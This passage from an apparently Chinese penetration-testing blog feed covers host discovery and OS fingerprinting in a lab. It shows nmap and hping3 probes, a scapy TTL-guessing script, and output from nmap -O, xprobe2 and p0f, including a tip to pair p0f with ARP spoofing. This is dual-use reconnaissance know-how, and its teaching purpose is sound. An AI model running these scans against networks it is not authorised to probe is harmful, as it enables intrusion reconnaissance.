class="keyword">in</span> the three major formats at once</span><br><span class="line">  -v: Increase verbosity level (use -vv or more <span class="keyword">for</span> greater effect)</span><br><span class="line">  -d: Increase debugging level (use -<span class="built_in">dd</span> or more <span class="keyword">for</span> greater effect)</span><br><span class="line">  --reason: Display the reason a port is <span class="keyword">in</span> a particular state</span><br><span class="line">  --open: Only show open (or possibly open) ports</span><br><span class="line">  --packet-trace: Show all packets sent and received</span><br><span class="line">  --iflist: Print host interfaces and routes (<span class="keyword">for</span> debugging)</span><br><span class="line">  --append-output: Append to rather than clobber specified output files</span><br><span class="line">  --resume &lt;filename&gt;: Resume an aborted scan</span><br><span class="line">  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML</span><br><span class="line">  --webxml: Reference stylesheet from Nmap.Org <span class="keyword">for</span> more portable XML</span><br><span class="line">  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output</span><br><span class="line">MISC:</span><br><span class="line">  -6: Enable IPv6 scanning</span><br><span class="line">  -A: Enable OS detection, version detection, script scanning, and traceroute</span><br><span class="line">  --datadir &lt;<span class="built_in">dirname</span>&gt;: Specify custom Nmap data file location</span><br><span class="line">  --send-eth/--send-ip: Send using raw ethernet frames or IP packets</span><br><span class="line">  --privileged: Assume that the user is fully privileged</span><br><span class="line">  --unprivileged: Assume the user lacks raw socket privileges</span><br><span class="line">  -V: Print version number</span><br><span class="line">  -h: Print this <span class="built_in">help</span> summary page.</span><br><span class="line">EXAMPLES:</span><br><span class="line">  nmap -v -A scanme.nmap.org</span><br><span class="line">  nmap -v -sn 192.168.0.0/16 10.0.0.0/8</span><br><span class="line">  nmap -v -iR 10000 -Pn -p 80</span><br><span class="line">SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># nmap 192.168.1.1-254 -PU53 -sn　　　　　　　　　　　　#UDP53端口扫描</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-20 21:39 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0069s latency).</span><br><span class="line">MAC Address: 0C:4B:54:33:72:9F (Tp-<span class="built_in">link</span> Technologies)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.108</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">MAC Address: 34:E1:2D:13:9D:EA (Intel Corporate)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.109</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 254 IP addresses (3 hosts up) scanned <span class="keyword">in</span> 10.59 seconds</span><br><span class="line">                                                                             </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># nmap 192.168.1.1-254 -PA80 -sn　　　　　　　　　　#直接用ACK数据包探测目标80端口</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-20 21:47 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line">MAC Address: 0C:4B:54:33:72:9F (Tp-<span class="built_in">link</span> Technologies)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.103</span><br><span class="line">Host is up (0.044s latency).</span><br><span class="line">MAC Address: 48:2C:A0:7B:90:CB (Xiaomi Communications)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.108</span><br><span class="line">Host is up (0.088s latency).</span><br><span class="line">MAC Address: 34:E1:2D:13:9D:EA (Intel Corporate)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.109</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 254 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 20.93 seconds</span><br><span class="line">                                                                             </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># nmap -iL /home/kali/Desktop/list.txt -PA80 -sn       #支持文件调用</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-20 22:05 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.1</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.254</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">MAC Address: 00:50:56:FC:55:15 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.2</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 00:50:56:F0:F4:B1 (VMware)</span><br><span class="line">Nmap <span class="keyword">done</span>: 4 IP addresses (3 hosts up) scanned <span class="keyword">in</span> 4.43 seconds</span><br></pre></td></tr></table></figure>
<h3 id="hping3">3、hping3</h3>
<p><strong>注意，基于UDP的判断均为ICMP端口不可达，另外默认情况是发TCP数据包探测</strong></p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali) -[/home/kali]</span><br><span class="line">└─<span class="comment"># hping3 10.10.10.2 --udp -c 1                                         #注意udp是小写</span></span><br><span class="line">HPING 10.10.10.2 (eth0 10.10.10.2): udp mode <span class="built_in">set</span>, 28 headers + 0 data bytes</span><br><span class="line"></span><br><span class="line">--- 10.10.10.2 hping statistic ---</span><br><span class="line">1 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line">                                                                        ┌──(root💀kali) -[/home/kali]</span><br><span class="line">└─<span class="comment"># hping3 10.10.10.3 --udp -c 1                                         </span></span><br><span class="line">HPING 10.10.10.3 (eth0 10.10.10.3): udp mode <span class="built_in">set</span>, 28 headers + 0 data bytes</span><br><span class="line"></span><br><span class="line">--- 10.10.10.3 hping statistic ---</span><br><span class="line">1 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line">                                                                        ┌──(root💀kali) -[/home/kali]</span><br><span class="line">└─<span class="comment"># hping3 114.114.114.114 --udp -c 1                                    #指定udp</span></span><br><span class="line">HPING 114.114.114.114 (eth0 114.114.114.114): udp mode <span class="built_in">set</span>, 28 headers + 0 data bytes</span><br><span class="line"></span><br><span class="line">--- 114.114.114.114 hping statistic ---</span><br><span class="line">1 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line">                                                                             </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># hping3 114.114.114.114  -c 2                                         #默认情况</span></span><br><span class="line">HPING 114.114.114.114 (eth0 114.114.114.114): NO FLAGS are <span class="built_in">set</span>, 40 headers + 0 data bytes</span><br><span class="line"></span><br><span class="line">--- 114.114.114.114 hping statistic ---</span><br><span class="line">2 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211121111818176-1078015897.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>主机探测</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集之操作系统识别</title>
    <url>/2021/12/01/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h2 id="操作系统识别">1. 操作系统识别</h2>
<p><strong>操作系统识别技术</strong></p>
<ul>
<li><strong>种类繁多</strong></li>
<li><strong>好产品采用多种技术组合</strong></li>
</ul>
<p><strong>TTL起始值</strong></p>
<ul>
<li><strong>默认情况，但不准确，因可修改TTL进行伪造</strong></li>
<li><strong>Windows: 128 (65- 128)</strong></li>
<li><strong>Linux/ Unix : 64 (1-64)</strong></li>
<li><strong>某些Unix : 255</strong></li>
</ul>
<p><strong>被动识别</strong></p>
<ul>
<li><strong>IDS</strong></li>
<li><strong>抓包分析</strong></li>
</ul>
<h2 id="识别方法">2. 识别方法</h2>
<h3 id="python脚本">1、python脚本</h3>
<p><strong>ttl_os.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&quot;scapy.runtime&quot;</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage - ./ttl_os.py  [IP Address]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Example - ./t tl_os.py  10.10.10.1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Example will perform ttl analysis to attempt to determine whether the system is windows or Linux/Unix&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">an=sr1(IP(dst=<span class="built_in">str</span>(ip))/ICMP(),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> an==<span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No response was returned!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(an[IP].ttl)&lt;=<span class="number">64</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Host is Linux/Unix!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Host is windows!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    ┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">    └─<span class="comment"># python3 ./ttl_os.py 10.10.10.131</span></span><br><span class="line">    Host is windows!</span><br><span class="line">                                                                                              </span><br><span class="line">    ┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">    └─<span class="comment"># python3 ./ttl_os.py 10.10.10.129</span></span><br><span class="line">    Host is Linux/Unix!                                                                                        </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"><span class="comment">### 2、nmap</span></span><br><span class="line"></span><br><span class="line">**使用多种技术识别，结合服务特征**</span><br><span class="line"></span><br><span class="line">**示例：**</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">    ┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">    └─<span class="comment"># nmap 10.10.10.129 -O          </span></span><br><span class="line">    Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 03:32 EST</span><br><span class="line">    Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">    Host is up (0.0013s latency).</span><br><span class="line">    Not shown: 992 closed ports</span><br><span class="line">    PORT     STATE SERVICE</span><br><span class="line">    21/tcp   open  ftp</span><br><span class="line">    22/tcp   open  ssh</span><br><span class="line">    80/tcp   open  http</span><br><span class="line">    139/tcp  open  netbios-ssn</span><br><span class="line">    143/tcp  open  imap</span><br><span class="line">    445/tcp  open  microsoft-ds</span><br><span class="line">    5001/tcp open  commplex-link</span><br><span class="line">    8080/tcp open  http-proxy</span><br><span class="line">    MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line">    Device <span class="built_in">type</span>: general purpose</span><br><span class="line">    Running: Linux 2.6.X</span><br><span class="line">    OS CPE: cpe:/o:linux:linux_kernel: 2.6</span><br><span class="line">    OS details: Linux 2.6.17 - 2.6.36</span><br><span class="line">    Network Distance: 1 hop</span><br><span class="line">    </span><br><span class="line">    OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">    Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.97 seconds</span><br><span class="line">                                                                                              </span><br><span class="line">    ┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">    └─<span class="comment"># nmap 10.10.10.131 -O</span></span><br><span class="line">    Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 03:32 EST</span><br><span class="line">    Nmap scan report <span class="keyword">for</span> 10.10.10.131</span><br><span class="line">    Host is up (0.00071s latency).</span><br><span class="line">    Not shown: 988 closed ports</span><br><span class="line">    PORT      STATE SERVICE</span><br><span class="line">    25/tcp    open  smtp</span><br><span class="line">    80/tcp    open  http</span><br><span class="line">    135/tcp   open  msrpc</span><br><span class="line">    139/tcp   open  netbios-ssn</span><br><span class="line">    443/tcp   open  https</span><br><span class="line">    445/tcp   open  microsoft-ds</span><br><span class="line">    777/tcp   open  multiling-http</span><br><span class="line">    1027/tcp  open  IIS</span><br><span class="line">    6002/tcp  open  X11:2</span><br><span class="line">    7001/tcp  open  afs3-callback</span><br><span class="line">    7002/tcp  open  afs3-prserver</span><br><span class="line">    31337/tcp open  Elite</span><br><span class="line">    MAC Address: 00:0C:29:76:04:88 (VMware)</span><br><span class="line">    Device <span class="built_in">type</span>: general purpose</span><br><span class="line">    Running: Microsoft Windows XP</span><br><span class="line">    OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3</span><br><span class="line">    OS details: Microsoft Windows XP SP2 or SP3</span><br><span class="line">    Network Distance: 1 hop</span><br><span class="line">    </span><br><span class="line">    OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">    Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.85 seconds</span><br></pre></td></tr></table></figure>
<h3 id="xprobe2">3、xprobe2</h3>
<p><strong>更专业的工具，但结果依旧存在误差</strong></p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># xprobe2             </span></span><br><span class="line"></span><br><span class="line">Xprobe2 v.0.3 Copyright (c) 2002-2005 fyodor@o0o.nu, ofir@sys-security.com, meder@o0o.nu</span><br><span class="line"></span><br><span class="line">usage: xprobe2 [options] target</span><br><span class="line">Options:</span><br><span class="line">          -v                       Be verbose</span><br><span class="line">          -r                       Show route to target(traceroute)</span><br><span class="line">          -p &lt;proto:portnum:state&gt; Specify portnumber, protocol and state.</span><br><span class="line">                                   Example: tcp:23:open, UDP:53:CLOSED</span><br><span class="line">          -c &lt;configfile&gt;          Specify config file to use.</span><br><span class="line">          -h                       Print this <span class="built_in">help</span>.</span><br><span class="line">          -o &lt;fname&gt;               Use logfile to <span class="built_in">log</span> everything.</span><br><span class="line">          -t &lt;time_sec&gt;            Set initial receive <span class="built_in">timeout</span> or roundtrip time.</span><br><span class="line">          -s &lt;send_delay&gt;          Set packsending delay (milseconds).</span><br><span class="line">          -d &lt;debuglv&gt;             Specify debugging level.</span><br><span class="line">          -D &lt;modnum&gt;              Disable module number &lt;modnum&gt;.</span><br><span class="line">          -M &lt;modnum&gt;              Enable module number &lt;modnum&gt;.</span><br><span class="line">          -L                       Display modules.</span><br><span class="line">          -m &lt;numofmatches&gt;        Specify number of matches to <span class="built_in">print</span>.</span><br><span class="line">          -T &lt;portspec&gt;            Enable TCP portscan <span class="keyword">for</span> specified port(s).</span><br><span class="line">                                   Example: -T21-23,53,110</span><br><span class="line">          -U &lt;portspec&gt;            Enable UDP portscan <span class="keyword">for</span> specified port(s).</span><br><span class="line">          -f                       force fixed round-trip time (-t opt).</span><br><span class="line">          -F                       Generate signature (use -o to save to a file).</span><br><span class="line">          -X                       Generate XML output and save it to logfile specified with -o.</span><br><span class="line">          -B                       Options forces TCP handshake module to try to guess open TCP port</span><br><span class="line">          -A                       Perform analysis of sample packets gathered during portscan <span class="keyword">in</span></span><br><span class="line">                                   order to detect suspicious traffic (i.e. transparent proxies,</span><br><span class="line">                                   firewalls/NIDSs resetting connections). Use with -T.</span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># xprobe2 10.10.10.131                                                              1 ⨯</span></span><br><span class="line"></span><br><span class="line">Xprobe2 v.0.3 Copyright (c) 2002-2005 fyodor@o0o.nu, ofir@sys-security.com, meder@o0o.nu</span><br><span class="line"></span><br><span class="line">[+] Target is 10.10.10.131</span><br><span class="line">[+] Loading modules.</span><br><span class="line">[+] Following modules are loaded:</span><br><span class="line">[x] [1] ping:icmp_ping  -  ICMP <span class="built_in">echo</span> discovery module</span><br><span class="line">[x] [2] ping:tcp_ping  -  TCP-based ping discovery module</span><br><span class="line">[x] [3] ping:udp_ping  -  UDP-based ping discovery module</span><br><span class="line">[x] [4] infogather:ttl_calc  -  TCP and UDP based TTL distance calculation</span><br><span class="line">[x] [5] infogather:portscan  -  TCP and UDP PortScanner</span><br><span class="line">[x] [6] fingerprint:icmp_echo  -  ICMP Echo request fingerprinting module</span><br><span class="line">[x] [7] fingerprint:icmp_tstamp  -  ICMP Timestamp request fingerprinting module</span><br><span class="line">[x] [8] fingerprint:icmp_amask  -  ICMP Address mask request fingerprinting module</span><br><span class="line">[x] [9] fingerprint:icmp_port_unreach  -  ICMP port unreachable fingerprinting module</span><br><span class="line">[x] [10] fingerprint:tcp_hshake  -  TCP Handshake fingerprinting module</span><br><span class="line">[x] [11] fingerprint:tcp_rst  -  TCP RST fingerprinting module</span><br><span class="line">[x] [12] fingerprint:smb  -  SMB fingerprinting module</span><br><span class="line">[x] [13] fingerprint:snmp  -  SNMPv2c fingerprinting module</span><br><span class="line">[+] 13 modules registered</span><br><span class="line">[+] Initializing scan engine</span><br><span class="line">[+] Running scan engine</span><br><span class="line">[-] ping:tcp_ping module: no closed/open TCP ports known on 10.10.10.131. Module <span class="built_in">test</span> failed</span><br><span class="line">[-] ping:udp_ping module: no closed/open UDP ports known on 10.10.10.131. Module <span class="built_in">test</span> failed</span><br><span class="line">[-] No distance calculation. 10.10.10.131 appears to be dead or no ports known</span><br><span class="line">[+] Host: 10.10.10.131 is up (Guess probability: 50%)</span><br><span class="line">[+] Target: 10.10.10.131 is alive. Round-Trip Time: 0.46900 sec</span><br><span class="line">[+] Selected safe Round-Trip Time value is: 0.93800 sec</span><br><span class="line">[-] fingerprint:tcp_hshake Module execution aborted (no open TCP ports known)</span><br><span class="line">[-] fingerprint:smb need either TCP port 139 or 445 to run</span><br><span class="line">[-] fingerprint:snmp: need UDP port 161 open</span><br><span class="line">[+] Primary guess:</span><br><span class="line">[+] Host 10.10.10.131 Running OS: ����TV (Guess probability: 100%)</span><br><span class="line">[+] Other guesses:</span><br><span class="line">[+] Host 10.10.10.131 Running OS: � ��TV (Guess probability: 100%)</span><br><span class="line">[+] Host 10.10.10.131 Running OS: � ��TV (Guess probability: 100%)</span><br><span class="line">[+] Host 10.10.10.131 Running OS: ����TV (Guess probability: 100%)</span><br><span class="line">[+] Host 10.10.10.131 Running OS: � ��TV (Guess probability: 100%)</span><br><span class="line">[+] Host 10.10.10.131 Running OS: � ��TV (Guess probability: 100%)</span><br><span class="line">[+] Host 10.10.10.131 Running OS: ����TV (Guess probability: 100%)</span><br><span class="line">[+] Host 10.10.10.131 Running OS: � ��TV (Guess probability: 100%)</span><br><span class="line">[+] Host 10.10.10.131 Running OS: � ��TV (Guess probability: 100%)</span><br><span class="line">[+] Host 10.10.10.131 Running OS: � ��TV (Guess probability: 100%)</span><br><span class="line">[+] Cleaning up scan engine</span><br><span class="line">[+] Modules deinitialized</span><br><span class="line">[+] Execution completed.</span><br></pre></td></tr></table></figure>
<h3 id="p0f被动">4、p0f（被动）</h3>
<p><strong>可结合ARP欺骗识别权威OS</strong></p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># p0f -h</span></span><br><span class="line">--- p0f 3.09b by Michal Zalewski &lt;lcamtuf@coredump.cx&gt; ---</span><br><span class="line"></span><br><span class="line">p0f: invalid option -- <span class="string">&#x27;h&#x27;</span></span><br><span class="line">Usage: p0f [ ...options... ] [ <span class="string">&#x27;filter rule&#x27;</span> ]</span><br><span class="line"></span><br><span class="line">Network interface options:</span><br><span class="line"></span><br><span class="line">  -i iface  - listen on the specified network interface</span><br><span class="line">  -r file   - <span class="built_in">read</span> offline pcap data from a given file</span><br><span class="line">  -p        - put the listening interface <span class="keyword">in</span> promiscuous mode</span><br><span class="line">  -L        - list all available interfaces</span><br><span class="line"></span><br><span class="line">Operating mode and output settings:</span><br><span class="line"></span><br><span class="line">  -f file   - <span class="built_in">read</span> fingerprint database from <span class="string">&#x27;file&#x27;</span> (/etc/p0f/p0f.fp)</span><br><span class="line">  -o file   - write information to the specified <span class="built_in">log</span> file</span><br><span class="line">  -s name   - answer to API queries at a named unix socket</span><br><span class="line">  -u user   - switch to the specified unprivileged account and <span class="built_in">chroot</span></span><br><span class="line">  -d        - fork into background (requires -o or -s)</span><br><span class="line"></span><br><span class="line">Performance-related options:</span><br><span class="line"></span><br><span class="line">  -S <span class="built_in">limit</span>  - <span class="built_in">limit</span> number of parallel API connections (20)</span><br><span class="line">  -t c,h    - <span class="built_in">set</span> connection / host cache age limits (30s,120m)</span><br><span class="line">  -m c,h    - <span class="built_in">cap</span> the number of active connections / hosts (1000,10000)</span><br><span class="line"></span><br><span class="line">Optional filter expressions (man tcpdump) can be specified <span class="keyword">in</span> the <span class="built_in">command</span></span><br><span class="line">line to prevent p0f from looking at incidental network traffic.</span><br><span class="line"></span><br><span class="line">Problems? You can reach the author at &lt;lcamtuf@coredump.cx&gt;.</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># p0f -i eth0                                                                       --- p0f 3.09b by Michal Zalewski &lt;lcamtuf@coredump.cx&gt; ---</span></span><br><span class="line"></span><br><span class="line">[+] Closed 1 file descriptor.</span><br><span class="line">[+] Loaded 322 signatures from <span class="string">&#x27;/etc/p0f/p0f.fp&#x27;</span>.</span><br><span class="line">[+] Intercepting traffic on interface <span class="string">&#x27;eth0&#x27;</span>.</span><br><span class="line">[+] Default packet filtering configured [+VLAN].</span><br><span class="line">[+] Entered main event loop.　　　　　　　　　　　　　　　　　　　　<span class="comment">#测试时故意触发个</span></span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51404 -&gt; 10.10.10.129/80 (syn) ]-</span><br><span class="line">|</span><br><span class="line">| client   = 10.10.10.135/51404</span><br><span class="line">| os       = Linux 2.2.x-3.x</span><br><span class="line">| dist     = 0</span><br><span class="line">| params   = generic</span><br><span class="line">| raw_sig  = 4:64+0:0:1460:mss*44,7:mss,sok,ts,nop,ws:<span class="built_in">df</span>,<span class="built_in">id</span>+:0</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51404 -&gt; 10.10.10.129/80 (mtu) ]-</span><br><span class="line">|</span><br><span class="line">| client   = 10.10.10.135/51404</span><br><span class="line">| <span class="built_in">link</span>     = Ethernet or modem</span><br><span class="line">| raw_mtu  = 1500</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51404 -&gt; 10.10.10.129/80 (syn+ack) ]-</span><br><span class="line">|</span><br><span class="line">| server   = 10.10.10.129/80</span><br><span class="line">| os       = Linux 2.6.x</span><br><span class="line">| dist     = 0</span><br><span class="line">| params   = none</span><br><span class="line">| raw_sig  = 4:64+0:0:1460:mss*4,5:mss,sok,ts,nop,ws:<span class="built_in">df</span>:0</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51404 -&gt; 10.10.10.129/80 (mtu) ]-</span><br><span class="line">|</span><br><span class="line">| server   = 10.10.10.129/80</span><br><span class="line">| <span class="built_in">link</span>     = Ethernet or modem</span><br><span class="line">| raw_mtu  = 1500</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51404 -&gt; 10.10.10.129/80 (http request) ]-</span><br><span class="line">|</span><br><span class="line">| client   = 10.10.10.135/51404</span><br><span class="line">| app      = Firefox 10.x or newer</span><br><span class="line">| lang     = English</span><br><span class="line">| params   = none</span><br><span class="line">| raw_sig  = 1:Host,User-Agent,Accept=[text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8],Accept-Language=[en-US,en;q=0.5],Accept-Encoding=[gzip, deflate],Connection=[keep-alive],Upgrade-Insecure-Requests=[1],?If-Modified-Since,?If-None-Match,?Cache-Control:Accept-Charset,Keep-Alive:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51404 -&gt; 10.10.10.129/80 (http response) ]-</span><br><span class="line">|</span><br><span class="line">| server   = 10.10.10.129/80</span><br><span class="line">| app      = Apache 2.x</span><br><span class="line">| lang     = none</span><br><span class="line">| params   = none</span><br><span class="line">| raw_sig  = 1:Date,Server,Connection=[Keep-Alive],Keep-Alive=[<span class="built_in">timeout</span>=15, max=100],?ETag,?Vary:Content-Type,Accept-Ranges:Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51406 -&gt; 10.10.10.129/80 (syn) ]-</span><br><span class="line">|</span><br><span class="line">| client   = 10.10.10.135/51406</span><br><span class="line">| os       = Linux 2.2.x-3.x</span><br><span class="line">| dist     = 0</span><br><span class="line">| params   = generic</span><br><span class="line">| raw_sig  = 4:64+0:0:1460:mss*44,7:mss,sok,ts,nop,ws:<span class="built_in">df</span>,<span class="built_in">id</span>+:0</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51406 -&gt; 10.10.10.129/80 (mtu) ]-</span><br><span class="line">|</span><br><span class="line">| client   = 10.10.10.135/51406</span><br><span class="line">| <span class="built_in">link</span>     = Ethernet or modem</span><br><span class="line">| raw_mtu  = 1500</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51406 -&gt; 10.10.10.129/80 (<span class="built_in">uptime</span>) ]-</span><br><span class="line">|</span><br><span class="line">| client   = 10.10.10.135/51406</span><br><span class="line">| <span class="built_in">uptime</span>   = 8 days 12 hrs 56 min (modulo 49 days)</span><br><span class="line">| raw_freq = 1000.00 Hz</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51406 -&gt; 10.10.10.129/80 (syn+ack) ]-</span><br><span class="line">|</span><br><span class="line">| server   = 10.10.10.129/80</span><br><span class="line">| os       = Linux 2.6.x</span><br><span class="line">| dist     = 0</span><br><span class="line">| params   = none</span><br><span class="line">| raw_sig  = 4:64+0:0:1460:mss*4,5:mss,sok,ts,nop,ws:<span class="built_in">df</span>:0</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51406 -&gt; 10.10.10.129/80 (mtu) ]-</span><br><span class="line">|</span><br><span class="line">| server   = 10.10.10.129/80</span><br><span class="line">| <span class="built_in">link</span>     = Ethernet or modem</span><br><span class="line">| raw_mtu  = 1500</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51406 -&gt; 10.10.10.129/80 (<span class="built_in">uptime</span>) ]-</span><br><span class="line">|</span><br><span class="line">| server   = 10.10.10.129/80</span><br><span class="line">| <span class="built_in">uptime</span>   = 0 days 0 hrs 35 min (modulo 198 days)</span><br><span class="line">| raw_freq = 240.00 Hz</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51406 -&gt; 10.10.10.129/80 (http request) ]-</span><br><span class="line">|</span><br><span class="line">| client   = 10.10.10.135/51406</span><br><span class="line">| app      = ???</span><br><span class="line">| lang     = English</span><br><span class="line">| params   = none</span><br><span class="line">| raw_sig  = 1:Host,User-Agent,Accept=[*/*],Accept-Language=[en-US,en;q=0.5],Accept-Encoding=[gzip, deflate],Connection=[keep-alive],?Referer,?If-Modified-Since,?If-None-Match,?Cache-Control:Accept-Charset,Keep-Alive:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">|</span><br><span class="line">`----</span><br><span class="line"></span><br><span class="line">.-[ 10.10.10.135/51406 -&gt; 